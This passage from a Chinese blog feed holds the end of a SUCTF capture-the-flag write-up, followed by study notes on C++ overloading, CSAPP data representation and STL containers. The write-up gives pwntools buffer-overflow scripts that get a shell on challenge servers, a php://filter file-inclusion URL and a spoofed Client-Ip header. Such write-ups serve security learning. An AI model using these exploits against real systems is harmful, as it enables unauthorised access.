+(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ) [&#x27;c&#x27;]+ (ﾟДﾟ) [&#x27;c&#x27;]+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (o^_^o)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟДﾟﾉ+ (c^_^o)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟｰﾟ)+ (ﾟДﾟ) .ﾟДﾟﾉ+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;);</span><br></pre></td></tr></table></figure>

<p>由于其规律性，猜测这可能是一种编码。费尽周折后终于找到了这门奇怪的编码<code>aaencode</code>，并找到<a href="https://tool.zcmzcm.org/aadecode">在线解码网址</a>。解码后得到flag。</p>
<h3 id="二、web"><a href="#二、web" class="headerlink" title="二、web"></a>二、web</h3><h4 id="1-where-are-you-from-level1"><a href="#1-where-are-you-from-level1" class="headerlink" title="1.where are you from level1"></a>1.where are you from level1</h4><p>进入题目中网址，它提示要“only guest from 127.0.0.1 can get flag of level1”。所以，猜测要伪造本机的IP地址，于是用fiddler拦截提交的网络包，在Http头中加入<code>Client-Ip: 127.0.0.1</code>，再发出。然后，网页就返回了flag。</p>
<h4 id="2-include-me"><a href="#2-include-me" class="headerlink" title="2.include me"></a>2.include me</h4><p>进入题目中网址，点击一下网页中的按钮后，通过网页的url<code>http://49.4.68.67:88/?lang=cn.php</code>可以看出这是一个文件包含漏洞题。于是，将url改成<code>http://49.4.68.67:88/index.php?lang=php://filter/read=convert.base64-encode/resource=index.php</code>即得到了base64加密的PHP源码。经过解码后，flag即在程序注释里。</p>
<h4 id="3-yunpan"><a href="#3-yunpan" class="headerlink" title="3.yunpan"></a>3.yunpan</h4><p>进入网址，发现是这样的：<img src="/SUCTF-writeup-douNine/yunpan.png" alt="小明的云盘">肯定第一眼点开readme.txt啊。readme.txt中提示了flag.php，但并没有给出任何源码。于是回到最初页面，右键检查网页，发现a标签中的href属性为<code>/download.php?file=5rOi5aSa6YeO57uT6KGjKEVNUC0wMDEpLmF2aQ==</code>。因此猜测可以这样输入url：<code>http://49.4.68.67:90/download.php?file=flag.php</code>，但是忘了base64加密呀，要改成：<code>http://49.4.68.67:90/download.php?file=ZmxhZy5waHA=</code>。然后flag.php就下载到电脑上了。</p>
<h3 id="三、pwn"><a href="#三、pwn" class="headerlink" title="三、pwn"></a>三、pwn</h3><h4 id="1-stack"><a href="#1-stack" class="headerlink" title="1.stack"></a>1.stack</h4><p>先在Ubuntu上用binwalk查看其中的pwn文件，发现这是一个64位的ELF文件，即Linux上的可执行文件。接着，到Windows中用IDA查看该文件，发现其中有一个next_door()函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">next_door</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，要让该文件执行这个函数就能破题，因为system(“&#x2F;bin&#x2F;sh”)可以调用了Linux的shell，即能为所欲为。然后我们在看到main()函数，其中的<code>read(0, &amp;buf, 0x30uLL);</code>显然是一个产生溢出的函数。于是求出buf字符与函数返回地址之间的差值：0x28，同时得到next_door()函数的地址为：0x0000000000400676。接下来就要写脚本了，脚本代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&#x27;43.254.3.203&#x27;</span>, <span class="number">10003</span>) <span class="comment"># 连接服务器主机</span></span><br><span class="line">pwn_elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)								<span class="comment"># 获取本地的pwn文件</span></span><br><span class="line"><span class="comment"># 进行字符串拼接，p6()将该地址转换成小端法返回</span></span><br><span class="line"><span class="comment"># pwn_elf.symbols[]也可以获取到该函数的地址</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(pwn_elf.symbols[<span class="string">&#x27;next_door&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> conn.recv()									<span class="comment"># 打印连接后返回的内容</span></span><br><span class="line">conn.sendline(payload)						<span class="comment"># 将拼接后的字符串发送到服务器</span></span><br><span class="line">conn.interactive()								<span class="comment"># 保持连接状态</span></span><br></pre></td></tr></table></figure>

<p>编写完后运行该脚本，即连接到服务器，并获取了服务器的shell，然后进入home&#x2F;ctf&#x2F;文件夹，然后cat查看flag即得到了flag。</p>
<h4 id="2-basic-pwn"><a href="#2-basic-pwn" class="headerlink" title="2.basic pwn"></a>2.basic pwn</h4><p>先判断这是一个64位ELF类型文件，然后用IDA查看该文件。发现这道题和第一题十分类似，有一个callThisFun()函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">callThisFun</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *path; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  path = <span class="string">&quot;/bin/cat&quot;</span>;</span><br><span class="line">  v2 = <span class="string">&quot;flag.txt&quot;</span>;</span><br><span class="line">  v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/cat&quot;</span>, &amp;path, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数调用了服务器的cat命令，并查看服务器中的一个flag.txt文件。显然只要调用这个函数，就能得到flag。再看一下主函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s, envp, argv);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个主函数中，有一个scanf()，显然是存在溢出漏洞的。因此，首先找到callThisFun()函数的地址：0x0000000000401157，再求出s与函数返回地址的差值：0x118。然后就可以写python脚本类了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&#x27;43.254.3.203&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">pwn = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x118</span> + p64(<span class="number">0x0000000000401157</span>)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p>连接到服务器并输送payload后，服务器就直接显示出了flag。</p>
<h4 id="3-babyarray"><a href="#3-babyarray" class="headerlink" title="3.babyarray"></a>3.babyarray</h4><p>同样先判断了这是个64位的ELF文件，然后用IDA进行查看。发现这道题只有一个正常的main()函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; ____  _   _  ____ _____ _____ &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;/ ___|| | | |/ ___|_   _|  ___|&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\\___ \\| | | | |     | | | |_   &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; ___) | |_| | |___  | | |  _|  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;|____/ \\___/ \\____| |_| |_|    &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;value:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, <span class="number">4LL</span> * v4 + <span class="number">6295712</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !a )</span><br><span class="line">    <span class="built_in">printf</span>(flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，只要能让a&#x3D;0，即能打印出flag。但a并不在主函数中，我们要先查看a的地址：0x0000000000601068。然后，观察主函数可以知道，只要让第二个scanf()函数将输入的0值放到a地址指向那片内存区域即可。因此，要让 4*v4+6295712 &#x3D; 0x0000000000601068，解一下方程可得 v4 &#x3D; -14。于是，可以开始写脚本了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&#x27;43.254.3.203&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">pwn_elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;-14&quot;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv()</span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本，连接到服务器后再输入0，即拿到了flag。</p>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C++重载与覆盖</title>
    <url>/C-%E9%87%8D%E8%BD%BD%E4%B8%8E%E8%A6%86%E7%9B%96.html</url>
    <content><![CDATA[<h2 id="重载与覆盖相同点"><a href="#重载与覆盖相同点" class="headerlink" title="重载与覆盖相同点"></a>重载与覆盖相同点</h2><p>都是函数之间的一种关系。不同点如下：</p>
<span id="more"></span>

<h2 id="重载（overload"><a href="#重载（overload" class="headerlink" title="重载（overload)"></a>重载（overload)</h2><p>1.函数名称相同，但是参数的个数或类型不全相同，即为重载。</p>
<p>2.重载出现的情况有：</p>
<ul>
<li>一个类中的多个函数之间重载</li>
<li>外部函数重载</li>
<li>子类中函数重载基类中函数</li>
</ul>
<h2 id="覆盖（override）"><a href="#覆盖（override）" class="headerlink" title="覆盖（override）"></a>覆盖（override）</h2><p>1.函数名称和参数都完全相同。</p>
<p>2.只能出现继承关系中，由子类函数覆盖基类函数。</p>
<p>覆盖也称<strong>重写</strong>。</p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>程序设计语言</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP第2章-数据表示</title>
    <url>/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>只记载重难点内容。</p>
<span id="more"></span>

<h2 id="1-进制转换"><a href="#1-进制转换" class="headerlink" title="1. 进制转换"></a>1. 进制转换</h2><p>计算机系统中，以二进制和十六进制最为重要，其转换如下：</p>
<p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/1.png" alt="img"></p>
<h2 id="2-寻址和字节顺序"><a href="#2-寻址和字节顺序" class="headerlink" title="2. 寻址和字节顺序"></a>2. 寻址和字节顺序</h2><ul>
<li><p>多字节对象被存储为连续的字节序列，对象的地址为所使用字节中的最小地址。假设一个<code>int</code>类型变量<code>x</code>，其地址<code>&amp;x</code>为0x100，那么<code>x</code>的4个字节将被存储在 <code>0x100</code>, <code>0x101</code>, <code>0x102</code>, <code>0x103</code> 的内存位置。</p>
</li>
<li><p>小端法，最低有效字节(LSB)在最前面(小地址)；大端法，最高有效字节(MSB)在最前面。示例：</p>
<p>  <img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/2.png" alt="img"></p>
</li>
</ul>
<h2 id="3-补码"><a href="#3-补码" class="headerlink" title="3. 补码"></a>3. 补码</h2><p>计算机的二进制表示都是采用<strong>补码</strong>的形式。</p>
<p>二进制补码转十进制公式：</p>
<p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/3.png" alt="img"></p>
<p>最高有效位 $X_w-1$ 为<strong>符号位</strong>，权重为 $-2^{w-1}$。其它第 $i$ 位权重则为 $2^{i}$。</p>
<p>十进制转二进制补码：</p>
<ul>
<li><p>先计算十进制对应二进制原码：</p>
<p>  <img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/4.png" alt="img"></p>
</li>
<li><p>若是<strong>正数</strong>，则 <strong>补码 &#x3D; 原码</strong>，即 $[x]_补 &#x3D; [x]_原$</p>
</li>
<li><p>若是<strong>负数</strong>，则 <strong>补码 &#x3D; 原码 取反 再加一</strong>，即 $[x]_补 &#x3D; ~[x]_原 + 1$</p>
</li>
</ul>
<h2 id="4-C语言中的移位运算"><a href="#4-C语言中的移位运算" class="headerlink" title="4. C语言中的移位运算"></a>4. C语言中的移位运算</h2><ul>
<li><p>算术右移，补符号位</p>
</li>
<li><p>逻辑右移，补零</p>
</li>
</ul>
<p>对于有符号数，右移则为算术右移；对于无符号数，则为逻辑右移。</p>
<p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/5.png" alt="img"></p>
<h2 id="5-浮点数"><a href="#5-浮点数" class="headerlink" title="5. 浮点数"></a>5. 浮点数</h2><p>以IEEE浮点数标准为主。</p>
<h3 id="5-1-二进制浮点数标准形式"><a href="#5-1-二进制浮点数标准形式" class="headerlink" title="5.1. 二进制浮点数标准形式"></a>5.1. 二进制浮点数标准形式</h3><p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/6.png" alt="img"></p>
<p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/7.png" alt="img"></p>
<p>示例：</p>
<p>如二进制小数：$$-1011.101$$</p>
<p>标准化后变为：$$ (-1)^1 \times 0.1011101(或1.011101) \times 2^5(或2^4)$$</p>
<h3 id="5-2-浮点数的位级表示"><a href="#5-2-浮点数的位级表示" class="headerlink" title="5.2. 浮点数的位级表示"></a>5.2. 浮点数的位级表示</h3><p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/8.png" alt="img"></p>
<ul>
<li><p>s字段，表示符号位</p>
</li>
<li><p>exp字段，表示阶码</p>
</li>
<li><p>face字段，表示尾数</p>
</li>
</ul>
<h3 id="5-3-浮点数编码对应的值"><a href="#5-3-浮点数编码对应的值" class="headerlink" title="5.3. 浮点数编码对应的值"></a>5.3. 浮点数编码对应的值</h3><p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/9.png" alt="img"></p>
<h4 id="5-3-1-规格化的值"><a href="#5-3-1-规格化的值" class="headerlink" title="5.3.1. 规格化的值"></a>5.3.1. 规格化的值</h4><p>条件：当<strong>exp字段既不全为0，也不全为1</strong>时。</p>
<ul>
<li><p>阶码的值 $$E &#x3D; exp - Bias$$ Bias为偏置常数，其值 $Bias &#x3D; 2^{k-1} - 1$，<code>k</code>为浮点数的位数。所以，单精度 $Bias &#x3D; 127$，双精度 $Bias &#x3D; 1023$；单精度 $E$ 的取值范围为 $-126 至 127$，双精度 $E$ 的取值范围为 $-1022 至 1023$</p>
<blockquote>
<p>设置偏置常数，保证exp字段为无符号(不需要考虑补码)，方便浮点数间的运算。</p>
</blockquote>
</li>
<li><p>尾数的值 $$M &#x3D; 1 + 0.face$$ 比如：face字段的值为$101000…000$，那么尾数的值 $M &#x3D; 1.101000…000$</p>
<blockquote>
<p>尾数部分隐含以1开头，因为我们总可以把$M$看成$1.f_{n-1}f_{n-2}…f_{0}$的二进制形式，相当于科学记数法。这种表示方法轻松获得额外精度位，同时由于第一位总是$1$，我们就不需要显式地表示它了。</p>
</blockquote>
</li>
</ul>
<h4 id="5-3-2-非规格化的值"><a href="#5-3-2-非规格化的值" class="headerlink" title="5.3.2. 非规格化的值"></a>5.3.2. 非规格化的值</h4><p>条件：当<strong>exp字段全为0</strong>时。</p>
<ul>
<li><p>阶码的值$$E &#x3D; 1 - Bias$$对于单精度或者双精度浮点数，这个值时固定的。</p>
<blockquote>
<p>为什么时 $1 - Bias$，而不是 $-Bias$？因为这样提供了一种非规格数向规格化数平滑过渡的方法。</p>
</blockquote>
</li>
<li><p>尾数的值$$M &#x3D; 0.face$$</p>
</li>
</ul>
<p>非规格化值的作用：</p>
<ol>
<li><p>提供可以表示数值0的方法。因为在规格化数中，$M &gt; 1$尾数永远大于1，无法表示0。</p>
</li>
<li><p>可以表示非常接近0的浮点数。同样因为规格化数要求$M &gt; 1$，而阶码又最小为 $-126$(单精度)，所以规格化数最小只能表示 $1.0 \times 2^{-126}$。由于非规格化数没有隐层尾数 $M$ 的 $1$，则其可以表示得更小，如：$0.00…001 \times 2^{-126}$。</p>
</li>
</ol>
<h4 id="5-3-3-无穷"><a href="#5-3-3-无穷" class="headerlink" title="5.3.3. 无穷"></a>5.3.3. 无穷</h4><p>条件：当<strong>exp字段全为1，同时face字段全为0</strong>时。</p>
<p>$s&#x3D;0$，正无穷；$s&#x3D;1$，负无穷。</p>
<h4 id="5-3-4-NaN-Not-a-Number"><a href="#5-3-4-NaN-Not-a-Number" class="headerlink" title="5.3.4. NaN(Not a Number)"></a>5.3.4. NaN(Not a Number)</h4><p>条件：当<strong>exp字段全为1，face字段非零</strong>时。</p>
<p>当计算 $\sqrt-1$ 等不合常理的式子时，会返回NaN。</p>
<h3 id="5-4-浮点数取值示例"><a href="#5-4-浮点数取值示例" class="headerlink" title="5.4. 浮点数取值示例"></a>5.4. 浮点数取值示例</h3><p>假设8位浮点数，其中：exp字段4位，face字段3位，B偏置常数 $Bias &#x3D; 2^{4-1} - 1 &#x3D; 7$。</p>
<p>其各种类型的表示和取值为：</p>
<p><img src="/csapp2-%E6%95%B0%E6%8D%AE%E8%A1%A8%E7%A4%BA/10.png" alt="img"></p>
]]></content>
      <categories>
        <category>九层之台，起于累土</category>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>计算机系统</tag>
      </tags>
  </entry>
  <entry>
    <title>STL学习笔记</title>
    <url>/STL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>STL是C++中的一个类库，提供常用的数据结构(如栈、队列等)和算法(如排序、查找等)。</p>
<p>灵活运用STL中的数据结构，可以帮助你有效解决很多算法问题。</p>
<p>简单记载STL中的常用内容。</p>
<span id="more"></span>

<h2 id="1-include-lt-stack-gt-栈"><a href="#1-include-lt-stack-gt-栈" class="headerlink" title="1. #include&lt;stack&gt; 栈"></a>1. #include&lt;stack&gt; 栈</h2><p>先进后出</p>
<h3 id="1-1-创建"><a href="#1-1-创建" class="headerlink" title="1.1. 创建"></a>1.1. 创建</h3><p><code>stack&lt;int&gt; s</code>: 声明一个栈，以整型为基本单位。也可以用其它数据类型为基本单位，包括结构体类型。</p>
<h3 id="1-2-增"><a href="#1-2-增" class="headerlink" title="1.2. 增"></a>1.2. 增</h3><p><code>s.push(num)</code>: 入栈</p>
<ul>
<li>参数：num，与声明栈时的数据类型相同</li>
<li>返回值：无</li>
</ul>
<h3 id="1-3-删"><a href="#1-3-删" class="headerlink" title="1.3. 删"></a>1.3. 删</h3><p><code>s.pop()</code>: 出栈</p>
<ul>
<li>参数：无</li>
<li>返回值：无</li>
</ul>
<h3 id="1-4-查"><a href="#1-4-查" class="headerlink" title="1.4. 查"></a>1.4. 查</h3><p><code>s.top()</code>: 获取栈顶元素</p>
<ul>
<li>参数：无</li>
<li>返回值：栈顶元素的值，与声明栈时的数据类型相同</li>
</ul>
<p><code>s.empty()</code>: 判断栈是否为空</p>
<ul>
<li>参数：无</li>
<li>返回值：bool类型，空为真，反之为假</li>
</ul>
<p><code>s.size()</code>: 获取栈长度</p>
<ul>
<li>参数：无</li>
<li>返回值：栈中元素个数，数据类型为<strong>无符号整型</strong>（要注意：若 size()-1&lt;0 ，则为无符号整型的最大值）</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">stack</span>&lt;<span class="type">int</span>&gt; s; <span class="comment">// 定义一个栈，基本单位为int类型</span></span><br><span class="line">  s.push(<span class="number">1</span>); <span class="comment">// push一个元素进栈</span></span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; s.size()<span class="number">-2</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 按常理 s.size()-2 应为-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：<code>18446744073709551615</code></p>
<h2 id="2-include-lt-queue-gt-队列"><a href="#2-include-lt-queue-gt-队列" class="headerlink" title="2. #include&lt;queue&gt; 队列"></a>2. #include&lt;queue&gt; 队列</h2><p>先进先出</p>
<h3 id="2-1-创建"><a href="#2-1-创建" class="headerlink" title="2.1. 创建"></a>2.1. 创建</h3><p><code>queue&lt;int&gt; q</code>: 声明一个队列，以整型为基本单位。也可以用其它数据类型为基本单位，包括结构体类型。</p>
<h3 id="2-2-增"><a href="#2-2-增" class="headerlink" title="2.2. 增"></a>2.2. 增</h3><p><code>q.push(num)</code>: 队尾进队列</p>
<ul>
<li>参数：num，与声明队列时的数据类型相同</li>
<li>返回值：无</li>
</ul>
<h3 id="2-3-删"><a href="#2-3-删" class="headerlink" title="2.3. 删"></a>2.3. 删</h3><p><code>s.pop()</code>: 队头出队列</p>
<ul>
<li>参数：无</li>
<li>返回值：无</li>
</ul>
<h3 id="2-4-查"><a href="#2-4-查" class="headerlink" title="2.4. 查"></a>2.4. 查</h3><p><code>q.front()</code>: 获取队头元素</p>
<ul>
<li>参数：无</li>
<li>返回值：队头元素的值，与声明队列时的数据类型相同</li>
</ul>
<p><code>q.back()</code>: 获取队尾元素</p>
<ul>
<li>参数：无</li>
<li>返回值：队尾元素的值，与声明队列时的数据类型相同</li>
</ul>
<p><code>q.empty()</code>: 判断队列是否为空</p>
<ul>
<li>参数：无</li>
<li>返回值：bool类型，空为真，反之为假</li>
</ul>
<p><code>q.size()</code>: 获取队列长度</p>
<ul>
<li>参数：无</li>
<li>返回值：队列中元素个数，数据类型为<strong>无符号整型</strong>(同上)</li>
</ul>
<h2 id="3-include-lt-vector-gt-动态数组"><a href="#3-include-lt-vector-gt-动态数组" class="headerlink" title="3. #include&lt;vector&gt; 动态数组"></a>3. #include&lt;vector&gt; 动态数组</h2><p>优点：</p>
<ul>
<li><p>动态数据个数</p>
</li>
<li><p>访问数据方便</p>
</li>
</ul>
<p>缺点：</p>
<ul>
<li>在中间插入删除不方便</li>
</ul>
<h3 id="3-1-创建"><a href="#3-1-创建" class="headerlink" title="3.1. 创建"></a>3.1. 创建</h3><p><code>vector&lt;int&gt; v</code>: 声明一个vector(其存储空间是连续的，类似于动态数组)，以整型为基本单位。</p>
<p><strong>注意</strong>：<code>vector v</code>的内存是分配在栈上的，而<code>v</code>中的元素是分配在堆上的。</p>
<h3 id="3-2-增"><a href="#3-2-增" class="headerlink" title="3.2. 增"></a>3.2. 增</h3><p><code>v.push_back(num)</code>: 将元素追加到vector结尾</p>
<ul>
<li>参数：num，与声明队列时的数据类型相同</li>
<li>返回值：无</li>
</ul>
<p><strong>注意</strong>：<code>v.push_back()</code>采用的是深拷贝。参考<a href="https://blog.csdn.net/love_fdu_llp/article/details/51407613">网上案例</a>，代码如下：</p>
